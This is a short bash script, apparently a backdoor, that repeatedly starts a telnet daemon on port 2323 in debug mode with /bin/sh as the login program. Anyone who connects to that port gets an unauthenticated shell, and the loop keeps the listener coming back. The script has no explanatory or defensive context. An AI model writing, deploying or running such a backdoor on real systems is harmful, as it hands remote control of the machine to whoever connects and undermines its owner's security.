#!/bin/bash
PUERTO=2323
while true; do
  (sleep 5; killall -9 telnetd) & 
  /usr/sbin/in.telnetd -debug $PUERTO -L /bin/sh
  sleep 1
done
